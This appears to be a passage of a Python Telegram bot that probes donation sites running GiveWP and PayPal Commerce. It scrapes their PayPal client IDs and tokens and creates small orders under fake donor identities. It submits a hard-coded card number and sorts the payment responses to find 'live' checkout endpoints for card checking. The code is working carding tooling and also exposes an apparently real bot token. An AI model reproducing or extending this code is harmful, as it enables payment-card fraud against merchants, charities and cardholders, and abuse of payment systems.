#!/usr/bin/env python3
import telebot
import time
import threading
from telebot import types
import requests, random, json, string, re, base64
from datetime import datetime, timedelta
import os
import html
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
import urllib3
import uuid
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from fake_useragent import UserAgent
    uu = UserAgent()
    HAS_FAKE_UA = True
except:
    HAS_FAKE_UA = False
    class SimpleUA:
        def __init__(self):
            self.agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            ]
        @property
        def random(self):
            return random.choice(self.agents)

token = '8407490230:AAEWWQvi_64s0BK5kGXn2XqU2DmYFqVx3lU'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
processing_status = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                return bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

def safe_send_message(chat_id, text, parse_mode="HTML", retries=3, reply_markup=None):
    for i in range(retries):
        try:
            return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

PAYPAL_RESPONSES = [
    'PAYER_CANNOT_PAY', 'Payer cannot pay', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED',
    'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED',
    'PAYMENT_DENIED', 'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD',
    'DO_NOT_HONOR', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS',
    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'SECURITY_VIOLATION',
    'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD',
    'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
    'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED', 'PAYEE_BLOCKED_TRANSACTION',
    'PAYER_ACCOUNT_RESTRICTED', 'PAYER_ACCOUNT_INVALID', 'CVV_FAILURE',
    'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED', 'PAYEE_ACCOUNT_RESTRICTED',
    'PAYEE_ACCOUNT_LOCKED_OR_CLOSED', 'PAYEE_ACCOUNT_INVALID',
    'PAYER_BLOCKED_TRANSACTION', 'INVALID_PAYER_ID', 'INVALID_PAYEE_ID',
    'AUTHORIZATION_DENIED', 'AUTHORIZATION_EXPIRED', 'CAPTURE_DECLINED',
    'INVALID_REQUEST', 'INVALID_PARAMETER', 'MALFORMED_REQUEST',
    'RATE_LIMIT_REACHED', 'INTERNAL_SERVER_ERROR',
]

DEAD_RESPONSES = [
    'invalid_client', 'Client Authentication failed', 'invalid_grant',
    'unsupported_grant_type', 'invalid_scope', 'Create Order Failed',
    'Invalid card format', 'No form fields', 'No au', 'No PayPal data',
    'Connection failed', 'Decode error', 'Invalid URL', 'Error:',
    'name', 'UserAgent', 'ImportError', 'Expecting value',
]


class PayPalLinkTester:
    def __init__(self, target_url):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "1.00"
        self.minimum_amount = "1.00"
        self.current_price_id = None
        self.r = requests.Session()
        self.r.verify = False
        if HAS_FAKE_UA:
            self.uu = UserAgent()
        else:
            self.uu = SimpleUA()
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self.target_url = target_url
        self.url = urlparse(target_url).netloc
        self.inurl = urlparse(target_url).path
        if urlparse(target_url).query:
            self.inurl += f"?{urlparse(target_url).query}"
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.js_checked = 0
        self.js_sources = []
        self.price_levels = []
        self.last_attempts = []

    def Charge(self, ccx):
        try:
            self._init_and_extract()
            self._try_all_token_methods()

            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]

            try:
                exp_year = int(f"20{yy}")
                exp_month = int(mm)
                now = datetime.now()
                if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
                    return "EXPIRED_CARD"
            except:
                pass

            expiry = f"20{yy}-{mm}"

            self._give_process_donation()
            order_id = self._create_order_smart()
            if not order_id:
                return "Create Order Failed"

            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)

            confirm_json = {}
            for auth_token in auth_tokens:
                he4 = {
                    'authorization': f'Bearer {auth_token}',
                    'paypal-client-metadata-id': self.client_id or '',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4()),
                }
                da3 = {
                    'payment_source': {
                        'card': {
                            'number': n, 'expiry': expiry, 'security_code': cvc,
                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                        }
                    },
                    'application_context': {'vault': False},
                }
                try:
                    confirm_res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                        headers=he4, json=da3, timeout=15
                    )
                    if confirm_res.status_code in (200, 400, 422):
                        try:
                            confirm_json = confirm_res.json()
                        except:
                            confirm_json = {}
                        break
                except:
                    continue

            if isinstance(confirm_json, dict):
                confirm_str = str(confirm_json).upper()
                for code in [
                    'INSUFFICIENT_FUNDS', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
                    'PAYEE_BLOCKED_TRANSACTION', 'SUSPECTED_FRAUD',
                    'EXPIRED_CARD', 'PAYER_CANNOT_PAY', 'ORDER_NOT_APPROVED',
                    'CVV2_FAILURE', 'CVV_FAILURE', 'DO_NOT_HONOR',
                    'GENERIC_DECLINE', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN',
                ]:
                    if code in confirm_str:
                        if code == 'ORDER_NOT_APPROVED':
                            return "Payer cannot pay for this transaction."
                        return code

            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''
            return self._clean_response(text)
        except Exception as e:
            return f"Error: {e}"

    def _init_and_extract(self):
        try:
            headers = {
                'user-agent': self.uu.random,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9'
            }
            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
            self.cookies = dict(response.cookies)
            html = response.text
            self._extract_client_id(html)
            self._extract_form_data(html)
            self._extract_ajax_url(html)
            self._extract_all_tokens(html)
            self._extract_minimum_amount(html)
            self._extract_price_levels(html)
            m = re.search(r'name="give-price-id"\s+value="([^"]*)"', html)
            if m and m.group(1).strip():
                self.current_price_id = m.group(1).strip()
            self._extract_from_js(html)
        except:
            pass

    def _extract_price_levels(self, html):
        levels = []
        for m in re.finditer(r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', html):
            try: levels.append((m.group(1), float(m.group(2))))
            except: pass
        for m in re.finditer(r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', html):
            try: levels.append((m.group(2), float(m.group(1))))
            except: pass
        for m in re.finditer(r'data-price=["\']([\d.]+)["\']', html):
            try: levels.append(('custom', float(m.group(1))))
            except: pass
        for m in re.finditer(r'<input[^>]*type="radio"[^>]*value=["\']([\d.]+)["\'][^>]*data-price-id=["\']([^"\']+)["\']', html):
            try: levels.append((m.group(2), float(m.group(1))))
            except: pass
        for m in re.finditer(r'<input[^>]*type="radio"[^>]*data-price-id=["\']([^"\']+)["\'][^>]*value=["\']([\d.]+)["\']', html):
            try: levels.append((m.group(1), float(m.group(2))))
            except: pass
        for m in re.finditer(r'<button[^>]*>([^<]*\$[\d.,]+[^<]*)</button>', html):
            try:
                amt_match = re.search(r'\$([\d.,]+)', m.group(1))
                if amt_match:
                    amt = float(amt_match.group(1).replace(',', ''))
                    levels.append(('custom', amt))
            except: pass
        for m in re.finditer(r'data-amount=["\']([\d.]+)["\']', html):
            try: levels.append(('custom', float(m.group(1))))
            except: pass
        for m in re.finditer(r'<option[^>]*value=["\']([\d.]+)["\']', html):
            try: levels.append(('custom', float(m.group(1))))
            except: pass
        for m in re.finditer(r'data-price-id=["\']([^"\']+)["\'][^>]*>[^<]*\$([\d.,]+)', html):
            try:
                amt = float(m.group(2).replace(',', ''))
                levels.append((m.group(1), amt))
            except: pass
        for m in re.finditer(r'<input[^>]*name="give-amount"[^>]*value=["\']([\d.]+)["\']', html):
            try: levels.append(('custom', float(m.group(1))))
            except: pass
        for m in re.finditer(r'"price_id"\s*:\s*"?(\d+)"?[^}]*?"amount"\s*:\s*"?([\d.]+)"?', html):
            try: levels.append((m.group(1), float(m.group(2))))
            except: pass
        seen = set()
        unique = []
        for pid, amt in levels:
            key = (pid, amt)
            if key not in seen and amt > 0:
                seen.add(key)
                unique.append((pid, amt))
        unique.sort(key=lambda x: x[1])
        self.price_levels = unique

    def _extract_minimum_amount(self, html):
        try:
            m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', html)
            if m and m.group(1).strip():
                try:
                    float(m.group(1))
                    self.minimum_amount = m.group(1)
                    return
                except:
                    pass
            mins = re.findall(r'<input[^>]*min=["\']([\d.]+)["\'][^>]*>', html, re.IGNORECASE)
            if mins:
                valid = [x for x in mins if x.replace('.', '').isdigit()]
                if valid:
                    self.minimum_amount = str(min(float(v) for v in valid))
        except:
            pass

    def _extract_from_js(self, html):
        try:
            js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html)
            priority = [u for u in js_urls if any(k in u.lower() for k in ['paypal', 'give', 'donation', 'ppcp', 'commerce', 'checkout'])]
            others = [u for u in js_urls if u not in priority]
            ordered = priority + others
            for js_url in ordered[:10]:
                try:
                    if js_url.startswith('//'): js_url = 'https:' + js_url
                    elif js_url.startswith('/'): js_url = f'https://{self.url}{js_url}'
                    elif not js_url.startswith('http'): js_url = f'https://{self.url}/{js_url}'
                    r2 = self.r.get(js_url, headers={'user-agent': self.uu.random, 'referer': f'https://{self.url}{self.inurl}'}, timeout=12)
                    self.js_checked += 1
                    if r2.status_code != 200 or not r2.text: continue
                    self.js_sources.append(js_url.split('/')[-1])
                    js_text = r2.text
                    if not self.client_id:
                        for p in [
                            r'client-id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                            r'"clientId"\s*:\s*"([^"]+)"',
                            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
                            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                            r'data-client-id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        ]:
                            mm = re.search(p, js_text, re.IGNORECASE)
                            if mm:
                                self.client_id = mm.group(1)
                                break
                    if not self.access_token:
                        for p in [r'"data-client-token"\s*:\s*"([^"]+)"',
                                  r'data-client-token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                                  r'client-token["\']?\s*[:=]\s*["\']([^"\']+)["\']']:
                            mm = re.search(p, js_text, re.IGNORECASE)
                            if mm:
                                enc = mm.group(1)
                                self.client_token = enc
                                try:
                                    padded = enc + '=' * (-len(enc) % 4)
                                    dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                                    tm = re.search(r'"accessToken":"([^"]+)"', dec)
                                    if tm:
                                        self.access_token = tm.group(1)
                                        break
                                except: pass
                    if not self.access_token:
                        for p in [r'"accessToken"\s*:\s*"([^"]+)"',
                                  r'accessToken["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                                  r'"access_token"\s*:\s*"([^"]+)"']:
                            mm = re.search(p, js_text, re.IGNORECASE)
                            if mm:
                                self.access_token = mm.group(1)
                                break
                    if not self.access_token:
                        for mm in re.finditer(r'"(A21[A-Za-z0-9+/=_-]{40,})"', js_text):
                            self.access_token = mm.group(1)
                            break
                    if not self.client_id:
                        for p in [r'merchant-id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                                  r'"merchant_id"\s*:\s*"([^"]+)"',
                                  r'"merchantId"\s*:\s*"([^"]+)"']:
                            mm = re.search(p, js_text, re.IGNORECASE)
                            if mm:
                                self.client_id = mm.group(1)
                                break
                    if self.access_token and self.client_id:
                        return
                except:
                    continue
        except:
            pass

    def _extract_client_id(self, html):
        patterns = [
            r'client-id=["\']([^"\']+)["\']', r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'data-client-id=["\']([^"\']+)["\']',
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'"clientId"\s*:\s*"([^"]+)"',
            r'merchant-id=["\']([^"\']+)["\']',
            r'"merchant_id"\s*:\s*"([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return
        for script in re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL):
            for pattern in patterns:
                match = re.search(pattern, script, re.IGNORECASE)
                if match:
                    self.client_id = match.group(1)
                    return
        for string in re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html):
            if string.startswith(('A', 'B', 'E')):
                self.client_id = string
                return

    def _extract_form_data(self, html):
        for name, value in re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html):
            self.form_data[name] = value
        for attr_name, attr_value in re.findall(r'data-([\w-]+)="([^"]+)"', html):
            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash', 'token', 'order']):
                self.form_data[attr_name] = attr_value

    def _extract_ajax_url(self, html):
        if 'admin-ajax.php' in html:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in html:
            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'

    def _extract_all_tokens(self, html):
        patterns = [
            r'data-client-token=["\']([^"\']+)["\']', r'"data-client-token"\s*:\s*"([^"]+)"',
            r'client-token=["\']([^"\']+)["\']', r'client_token=["\']([^"\']+)["\']',
            r'clientToken=["\']([^"\']+)["\']', r'"clientToken"\s*:\s*"([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                enc = match.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                    if token_match:
                        self.access_token = token_match.group(1)
                        return
                except:
                    pass
                self.client_token = enc
                return
        for pattern in [r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']', r'"accessToken"\s*:\s*"([^"]+)"',
                        r'access_token["\']?\s*:\s*["\']([^"\']+)["\']', r'"access_token"\s*:\s*"([^"]+)"',
                        r'accessToken=([^&\s"\']+)']:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.access_token = match.group(1)
                return

    def _try_all_token_methods(self):
        if self.access_token: return
        if self.client_id:
            token = self._get_oauth_token()
            if token:
                self.access_token = token
                return
        if self.ajax_url:
            token = self._get_client_token_from_site()
            if token:
                self.access_token = token
                return

    def _get_oauth_token(self):
        try:
            auth_header = base64.b64encode(f"{self.client_id}:".encode()).decode()
            headers = {'authorization': f'Basic {auth_header}', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': self.uu.random}
            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, timeout=15)
            if response.status_code == 200:
                return response.json().get('access_token')
        except: pass
        try:
            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', auth=(self.client_id, ''), data={'grant_type': 'client_credentials'}, headers={'user-agent': self.uu.random}, timeout=15)
            if response.status_code == 200:
                return response.json().get('access_token')
        except: pass
        return None

    def _get_client_token_from_site(self):
        actions = ['give_paypal_commerce_get_client_token', 'get_client_token', 'paypal_get_client_token', 'give_paypal_get_client_token', 'ppcp_get_client_token', 'wc_ppcp_get_client_token']
        for action in actions:
            try:
                data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                headers = {'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                if response.status_code == 200 and response.text:
                    try: json_data = response.json()
                    except: continue
                    token = None
                    if 'data' in json_data:
                        if isinstance(json_data['data'], dict):
                            token = json_data['data'].get('client_token') or json_data['data'].get('token') or json_data['data'].get('access_token')
                        elif isinstance(json_data['data'], str):
                            token = json_data['data']
                    elif 'client_token' in json_data: token = json_data['client_token']
                    elif 'token' in json_data: token = json_data['token']
                    elif 'access_token' in json_data: token = json_data['access_token']
                    if token:
                        if '.' not in token:
                            try:
                                padded = token + '=' * (-len(token) % 4)
                                decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                                token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                                if token_match:
                                    return token_match.group(1)
                            except: pass
                        return token
            except: continue
        return None

    def _give_process_donation(self):
        if not self.ajax_url: return None
        try:
            headers = {
                'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest',
                'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            }
            form_data = self.form_data.copy()
            form_data.update({
                'give-amount': self.donation, 'payment-mode': 'paypal-commerce',
                'give_first': random.choice(self.first_name), 'give_last': random.choice(self.last_name),
                'give_email': self.email, 'give-gateway': 'paypal-commerce',
                'give-honeypot': '', 'give_ajax': 'true', 'action': 'give_process_donation',
            })
            r = self.r.post(self.ajax_url, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
            return r
        except: return None

    def _create_order_smart(self):
        if not self.ajax_url:
            return self._create_order_direct()
        attempts = []
        for pid, amt in self.price_levels:
            attempts.append((pid, amt))
        if self.current_price_id:
            for amt in [1.0, 2.0, 3.0, 5.0, 10.0, 15.0, 20.0, 25.0, 50.0, 100.0]:
                attempts.append((self.current_price_id, amt))
        for amt in [1.0, 2.0, 3.0, 5.0, 10.0]:
            attempts.append(('', amt))
        for amt in [1.0, 2.0, 3.0, 5.0]:
            attempts.append(('custom', amt))
        for amt in [1.0, 5.0, 10.0]:
            attempts.append(('3', amt))
        if self.minimum_amount and self.minimum_amount != "1.00":
            try:
                for pid in [self.current_price_id, 'custom', '', '3']:
                    if pid is not None:
                        attempts.append((str(pid), float(self.minimum_amount)))
            except: pass
        seen = set()
        unique = []
        for pid, amt in attempts:
            key = (str(pid), float(amt))
            if key not in seen:
                seen.add(key)
                unique.append((str(pid), float(amt)))
        unique.sort(key=lambda x: x[1])
        for pid, amt in unique:
            amount_str = f"{amt:.2f}"
            self.donation = amount_str
            order_id = self._create_order_givewp_with_price(pid, amount_str)
            self.last_attempts.append({'pid': pid, 'amount': amount_str, 'result': 'ok' if order_id else 'fail'})
            if order_id:
                return order_id
            time.sleep(0.3)
        if self.access_token:
            return self._create_order_direct()
        if self.client_token:
            return self._create_order_with_client_token()
        return None

    def _create_order_givewp_with_price(self, price_id, amount):
        if not self.ajax_url: return None
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': amount, 'give-price-id': price_id,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name), 'give_last': random.choice(self.last_name),
            'give_email': self.email, 'give-gateway': 'paypal-commerce',
        })
        headers = {
            'user-agent': self.uu.random, 'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        for action in ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']:
            try:
                response = self.r.post(self.ajax_url, params={'action': action}, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200 and response.text and len(response.text.strip()) > 0:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                                return json_data['data']['id']
                            elif isinstance(json_data['data'], str):
                                return json_data['data']
                        if 'id' in json_data: return json_data['id']
                        if 'order_id' in json_data: return json_data['order_id']
                        if 'orderID' in json_data: return json_data['orderID']
                    except: pass
            except: continue
        return None

    def _create_order_direct(self):
        if not self.access_token: return None
        try:
            headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json',
                       'user-agent': self.uu.random, 'accept': 'application/json', 'paypal-request-id': str(uuid.uuid4())}
            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': 'USD', 'value': self.donation}}],
                    'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data: return response_data['id']
            return None
        except: return None

    def _create_order_with_client_token(self):
        if not self.client_token: return None
        try:
            headers = {'authorization': f'Bearer {self.client_token}', 'content-type': 'application/json',
                       'user-agent': self.uu.random, 'accept': 'application/json'}
            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': 'USD', 'value': self.donation}}]}
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data: return response_data['id']
            return None
        except: return None

    def _approve_order(self, order_id):
        if self.ajax_url and 'admin-ajax' in self.ajax_url:
            result = self._approve_order_givewp(order_id)
            if result: return result
        if self.access_token:
            try:
                headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.uu.random}
                response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=15)
                return response
            except: pass
        return None

    def _approve_order_givewp(self, order_id):
        if not self.ajax_url: return None
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation, 'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name), 'give_last': random.choice(self.last_name),
            'give_email': self.email, 'give-gateway': 'paypal-commerce',
        })
        headers = {
            'user-agent': self.uu.random, 'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        for action in ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']:
            try:
                response = self.r.post(self.ajax_url, params={'action': action, 'order': order_id}, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200: return response
            except: continue
        return None

    def _clean_response(self, text):
        if not text: return "DECLINED"
        text_upper = text.upper(); text_lower = text.lower()
        if '<!DOCTYPE' in text_upper or '<html' in text_upper: return "DECLINED"
        if 'true' in text_lower or 'charge 1' in text_lower or 'charge $' in text_lower or 'charged' in text_lower or 'completed' in text_lower or 'approved' in text_lower or 'success' in text_lower:
            if 'error' not in text_lower and 'expecting' not in text_lower and 'invalid' not in text_lower:
                return "CHARGE 1.0"
        codes_priority = [
            ('INSUFFICIENT_FUNDS', 'INSUFFICIENT_FUNDS'),
            ('PAYER_CANNOT_PAY', 'PAYER_CANNOT_PAY'),
            ('ORDER_NOT_APPROVED', 'Payer cannot pay for this transaction.'),
            ('RESTRICTED_OR_INACTIVE_ACCOUNT', 'RESTRICTED_OR_INACTIVE_ACCOUNT'),
            ('PAYEE_BLOCKED_TRANSACTION', 'PAYEE_BLOCKED_TRANSACTION'),
            ('SUSPECTED_FRAUD', 'SUSPECTED_FRAUD'),
            ('DO_NOT_HONOR', 'DO_NOT_HONOR'),
            ('GENERIC_DECLINE', 'GENERIC_DECLINE'),
            ('CVV2_FAILURE', 'CVV2_FAILURE'),
            ('CVV_FAILURE', 'CVV_FAILURE'),
            ('EXPIRED_CARD', 'EXPIRED_CARD'),
            ('EXPIRED_CREDIT_CARD', 'EXPIRED_CREDIT_CARD'),
            ('ACCOUNT_CLOSED', 'ACCOUNT_CLOSED'),
            ('LOST_OR_STOLEN', 'LOST_OR_STOLEN'),
            ('TRANSACTION_REFUSED', 'TRANSACTION_REFUSED'),
            ('INVALID_ACCOUNT', 'INVALID_ACCOUNT'),
            ('AUTHENTICATION_FAILURE', 'AUTHENTICATION_FAILURE'),
            ('PAYMENT_DENIED', 'PAYMENT_DENIED'),
            ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED_DUE_TO_UPDATED_ACCOUNT'),
            ('INVALID_OR_RESTRICTED_CARD', 'INVALID_CARD'),
            ('INSTRUMENT_DECLINED', 'INSTRUMENT_DECLINED'),
            ('CARD_DECLINED', 'CARD_DECLINED'),
            ('TRANSACTION_NOT_PERMITTED', 'TRANSACTION_NOT_PERMITTED'),
            ('COMPLIANCE_VIOLATION', 'COMPLIANCE_VIOLATION'),
            ('SECURITY_VIOLATION', 'SECURITY_VIOLATION'),
            ('ACCOUNT_BLOCKED_BY_ISSUER', 'ACCOUNT_BLOCKED_BY_ISSUER'),
            ('REATTEMPT_NOT_PERMITTED', 'REATTEMPT_NOT_PERMITTED'),
            ('PICKUP_CARD_SPECIAL_CONDITIONS', 'PICKUP_CARD_SPECIAL_CONDITIONS'),
            ('TX_ATTEMPTS_EXCEED_LIMIT', 'TX_ATTEMPTS_EXCEED_LIMIT'),
            ('CRYPTOGRAPHIC_FAILURE', 'CRYPTOGRAPHIC_FAILURE'),
            ('TRANSACTION_CANNOT_BE_COMPLETED', 'TRANSACTION_CANNOT_BE_COMPLETED'),
            ('DECLINED_PLEASE_RETRY', 'DECLINED_PLEASE_RETRY'),
            ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED'),
            ('INVALID_TRANSACTION', 'INVALID_TRANSACTION'),
            ('PAYER_ACCOUNT_RESTRICTED', 'PAYER_ACCOUNT_RESTRICTED'),
            ('PAYER_ACCOUNT_INVALID', 'PAYER_ACCOUNT_INVALID'),
        ]
        for keyword, label in codes_priority:
            if keyword.lower() in text_lower:
                return label
        if 'declined' in text_lower: return "DECLINED"
        if 'error' in text_lower or 'invalid' in text_lower or 'failed' in text_lower: return "DECLINED"
        return text[:80]


def check_single_link(link):
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL'}
        paypal = PayPalLinkTester(target_url=link)
        result = paypal.Charge('4059986126444431|11|30|947')
        is_live = False
        for pr in PAYPAL_RESPONSES:
            if pr.lower() in result.lower():
                is_live = True
                break
        if is_live:
            return {
                'link': link, 'live': True, 'respons': result,
                'amount': paypal.donation or paypal.minimum_amount,
